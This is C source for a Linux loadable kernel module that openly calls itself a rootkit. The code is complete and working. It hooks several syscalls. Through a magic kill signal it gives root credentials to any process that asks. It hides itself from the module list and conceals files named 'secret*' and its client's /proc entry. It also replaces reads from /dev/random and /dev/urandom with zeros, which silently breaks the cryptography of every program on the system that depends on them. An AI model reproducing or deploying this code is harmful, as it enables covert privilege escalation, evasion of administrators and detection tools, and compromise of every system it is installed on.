#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include "hooking.c"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

// Prefix of files that we wish to hide
#define ROOTI_HIDE_PREFIX "secret"

// Unused signal numbers can, be used by the rootkit for its own purposes
enum rooti_signals {
    ROOTI_SIG_HIDE = 63,  // toogle hiding of this kernel module
    ROOTI_SIG_REG = 64    // request by a usermode process to be serviced by the rootkit
};

/*
    Represents a userspace process which was registered by the rootkit in order to get access
    to its features such as privilege escalation, hiding of the process etc.
*/
struct rooti_client_proc {
    pid_t pid;            // PID of the client
    char name[NAME_MAX];  // PID of the client, but as a string (filename in /proc)
};

/*
    This struct stores some file descriptor that is of interest to us which was opened
    by some usermode process. This struct would be initialized in a hook for some open-like syscall
    and read in a hook for some read-like or write-like syscall whenever we want to tamper with file I/O.
*/
struct rooti_tamper_fd {
    int fd;                 // file descriptor number
    pid_t pid;              // PID of the owner
    struct list_head head;  // linked list head
};

// Userspace process serviced by this rootkit
static struct rooti_client_proc rooti_client = { .pid = 0 };

// List of FDs to /dev/random or /dev/urandom opened by userspace processes
static LIST_HEAD(rooti_random_tamper_fds);

// List of /proc directory FDs opened by userspace processes
static LIST_HEAD(rooti_proc_tamper_fds);

/* Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
 * When hidden, the variable rooti_prev_module stores the address of the node that was previous
 * before this module in the list, otherwise it is NULL;
*/
static bool rooti_hidden = false;
static struct list_head *rooti_prev_module = NULL;

// References to the original syscall handlers which we are hooking
static asmlinkage long (*rooti_orig_kill)(const struct pt_regs *regs);
static asmlinkage long (*rooti_orig_openat)(const struct pt_regs *regs);
static asmlinkage long (*rooti_orig_close)(const struct pt_regs *regs);
static asmlinkage long (*rooti_orig_dup2)(const struct pt_regs *regs);
static asmlinkage long (*rooti_orig_read)(const struct pt_regs *regs);
static asmlinkage long (*rooti_orig_getdents64)(const struct pt_regs *regs);

/*
    Escalates the privilege of the current process in execution to root user & group.
*/
static int rooti_elevate_privilege(void)
{
    // Prepare new set of credentials
    struct cred *creds = prepare_creds();
    if (creds == NULL) {
        printk(KERN_DEBUG "rooti: prepare_creds() failed, out of memory\n");
        return -ENOMEM;
    }

    // Modify credentials to those of root user & group
    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    // Commit new set of credentials in the context of the process in execution
    commit_creds(creds);

    return 0;
}

/*
    Registers a new client user process.
*/
static int rooti_register_client(pid_t pid)
{
    // Initialize client process
    rooti_client.pid = pid;
    sprintf(rooti_client.name, "%d", pid);

    // Privilege escalation to root
    return rooti_elevate_privilege();
}

/*
    Hides this rootkit by removing it from the kernel modules list.
*/
static void rooti_hideme(void)
{
    rooti_hidden = true;
    rooti_prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/*
    Reveals this rootkit by re-adding it to the kernel modules list.
*/
static void rooti_showme(void)
{
    rooti_hidden = false;
    list_add(&THIS_MODULE->list, rooti_prev_module);
    rooti_prev_module = NULL;
}

static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    if (sig == ROOTI_SIG_HIDE) {
        // Toggle hidden state
        if (rooti_hidden) {
            rooti_showme();
        } else {
            rooti_hideme();
        }
        return 0;
    }
    else if (sig == ROOTI_SIG_REG) {
        // Register the new process
        return rooti_register_client(current->pid);
    }
    return rooti_orig_kill(regs);
}


static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
{
    // Allocate a kernel buffer for the filename
    struct rooti_tamper_fd *tamper_fd = NULL;
    char *filepath_user = (char *)regs->si;
    char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
    if (filepath_kernel == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
        return rooti_orig_openat(regs);
    }

    // Copy the requested filename to the kernel mode buffer
    int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
        kfree(filepath_kernel);
        return rooti_orig_openat(regs);
    }
    
    // Check if the requested file to open is one of the two Linux char devices providing random bytes
    if (strncmp(filepath_kernel, "/dev/random", NAME_MAX) == 0 || strncmp(filepath_kernel, "/dev/urandom", NAME_MAX) == 0) {
        pid_t pid = current->pid;
        int fd = rooti_orig_openat(regs);

        // Allocate a new record of an open fd
        tamper_fd = kmalloc(sizeof(*tamper_fd), GFP_KERNEL);
        if (tamper_fd == NULL) {
            printk(KERN_DEBUG "rooti: failed to allocate memory\n");
            return fd;
        }
        tamper_fd->pid = pid;
        tamper_fd->fd = fd;

        // Append the new record
        INIT_LIST_HEAD(&tamper_fd->head);
        list_add_tail(&tamper_fd->head, &rooti_random_tamper_fds);

        kfree(filepath_kernel);
        return fd;
    }
    // Check if the requested file to open is the /proc directory
    else if (strncmp(filepath_kernel, "/proc", NAME_MAX) == 0) {
        pid_t pid = current->pid;
        int fd = rooti_orig_openat(regs);

        // Allocate a new record of an open fd
        tamper_fd = kmalloc(sizeof(*tamper_fd), GFP_KERNEL);
        if (tamper_fd == NULL) {
            printk(KERN_DEBUG "rooti: failed to allocate memory\n");
            return fd;
        }
        tamper_fd->pid = pid;
        tamper_fd->fd = fd;

        // Append the new record
        INIT_LIST_HEAD(&tamper_fd->head);
        list_add_tail(&tamper_fd->head, &rooti_proc_tamper_fds);

        kfree(filepath_kernel);
        return fd;
    }

    kfree(filepath_kernel);
    return rooti_orig_openat(regs);
}

static asmlinkage long rooti_hook_close(const struct pt_regs *regs)
{
    pid_t pid = current->pid;
    int fd = regs->di;

    // If present, remove the open FD from the list of tampared FDs
    struct rooti_tamper_fd *record, *tmp;
    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
        if (pid == record->pid && fd == record->fd) {
            list_del(&record->head);
            kfree(record);
        }
    }
    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
        if (pid == record->pid && fd == record->fd) {
            list_del(&record->head);
            kfree(record);
        }
    }
    return rooti_orig_close(regs);
}

static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs)
{
    pid_t pid = current->pid;
    int oldfd = regs->di;
    int newfd = rooti_orig_dup2(regs);

    // If present, update the FD of the tampered file.
    struct rooti_tamper_fd *record;
    struct rooti_tamper_fd *tmp;
    struct rooti_tamper_fd *new;
    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
        if (pid == record->pid && oldfd == record->fd) {
            // Append new record for duplicated FD
            new = kmalloc(sizeof(*new), GFP_KERNEL);
            if (new == NULL) {
                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
                return newfd;
            }
            new->pid = pid;
            new->fd = newfd; 

            INIT_LIST_HEAD(&new->head);
            list_add_tail(&new->head, &rooti_random_tamper_fds);
        }
    }
    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
        if (pid == record->pid && oldfd == record->fd) {
            // Append new record for duplicated FD
            new = kmalloc(sizeof(*new), GFP_KERNEL);
            if (new == NULL) {
                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
                return newfd;
            }
            new->pid = pid;
            new->fd = newfd; 

            INIT_LIST_HEAD(&new->head);
            list_add_tail(&new->head, &rooti_proc_tamper_fds);
        }
    }

    return newfd;
}

static asmlinkage long rooti_hook_read(const struct pt_regs *regs)
{
    pid_t pid = current->pid;
    int fd = regs->di;
    char *user_buf = (char *)regs->si;
    size_t count = regs->dx;
    size_t nread = rooti_orig_read(regs);
    
    struct rooti_tamper_fd *record;
    list_for_each_entry(record, &rooti_random_tamper_fds, head)  {
        if (pid == record->pid && fd == record->fd) {
            // Allocate kernel buffer filled with zeros
            char *kernel_buf = kzalloc(count, GFP_KERNEL);
            if (kernel_buf == NULL) {
                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
                return nread;
            }
            // Coppy rigged kernel buffer into user buffer
            int err = copy_to_user(user_buf, kernel_buf, count);
            if (err > 0) {
                printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
                kfree(kernel_buf);
                return nread;
            }
            kfree(kernel_buf);
        }
    }
    return nread;
}

static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
{
    // Invoke the original syscall
    int fd  = regs->di;
    struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
    int nread = rooti_orig_getdents64(regs);
    if (nread < 0) {
        return nread;
    }

    // Allocate a kernel buffer to store the data returned to user
    struct linux_dirent64 *kernel_buf = kmalloc(nread, GFP_KERNEL);
    if (kernel_buf == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
        return nread;
    }

    // Copy the return data of the syscall to our kernel buffer
    int err = copy_from_user(kernel_buf, user_buf, nread);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
        kfree(kernel_buf);
        return nread;
    }

    // Check if the directory FD is of /proc
    bool is_proc_dir = false;
    struct rooti_tamper_fd *record;
    list_for_each_entry(record, &rooti_proc_tamper_fds, head) {
        if (current->pid == record->pid && fd == record->fd) {
            is_proc_dir = true;
            break;
        }
    }

    // Tamper with the returned records, concealing any files we wish to hide 
    struct linux_dirent64 *curr_record = NULL;
    struct linux_dirent64 *prev_record = NULL;
    unsigned long offset = 0;
    unsigned short prefix_length = strlen(ROOTI_HIDE_PREFIX);
    while (offset < nread) {
        curr_record = (void *)kernel_buf + offset;
        // Check if the current file begins with the defined prefix, or if the filename is the PID of the process to hide
        if ((is_proc_dir && strncmp(curr_record->d_name, rooti_client.name, NAME_MAX) == 0) ||
            (strlen(curr_record->d_name) >= prefix_length && memcmp(curr_record->d_name, ROOTI_HIDE_PREFIX, prefix_length) == 0)) {
            // Special case where to to hide is is the first element
            if (curr_record == kernel_buf) {
                // Shift the entire buffer to override the current record
                nread -= curr_record->d_reclen;
                memmove(curr_record, (void *)curr_record + curr_record->d_reclen, nread);
                continue;
            } else {
                // Increase the size of previous record to override the current record
                prev_record->d_reclen += curr_record->d_reclen;
            }
        } else {
            prev_record = curr_record;
        }
        offset += curr_record->d_reclen;
    }

    // Copy the rigged buffer back to userspace
    err = copy_to_user(user_buf, kernel_buf, nread);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
        kfree(kernel_buf);
        return nread;
    }

    kfree(kernel_buf);
    return nread;
}


// List of system calls to hook :D
struct rooti_syscall_hook hooks[] = {
    ROOTI_HOOK("sys_kill", rooti_hook_kill, &rooti_orig_kill),
    ROOTI_HOOK("sys_openat", rooti_hook_openat, &rooti_orig_openat),
    ROOTI_HOOK("sys_close", rooti_hook_close, &rooti_orig_close),
    ROOTI_HOOK("sys_dup2", rooti_hook_dup2, &rooti_orig_dup2),
    ROOTI_HOOK("sys_read", rooti_hook_read, &rooti_orig_read),
    ROOTI_HOOK("sys_getdents64", rooti_hook_getdents64, &rooti_orig_getdents64)
};


/* LKM initialization */
static int __init rooti_init(void)
{
    printk(KERN_INFO "rooti: init\n");
    
    int ret = rooti_hooking_init();
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_hooking_init() failed: %d\n", ret);
        return ret;
    }

    // Install hooks :D
    ret = rooti_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
        return ret;
    }

    // TODO: at some point rooti_hideme() should be called on init

    return 0;
}

/* LKM cleanup */
static void __exit rooti_exit(void)
{
    printk(KERN_INFO "rooti: exit\n");
    rooti_uninstall_hooks(hooks, ARRAY_SIZE(hooks));

    struct rooti_tamper_fd *record, *tmp;
    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
        list_del(&record->head);
        kfree(record);
    }
    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
        list_del(&record->head);
        kfree(record);
    }
}

module_init(rooti_init);
module_exit(rooti_exit);
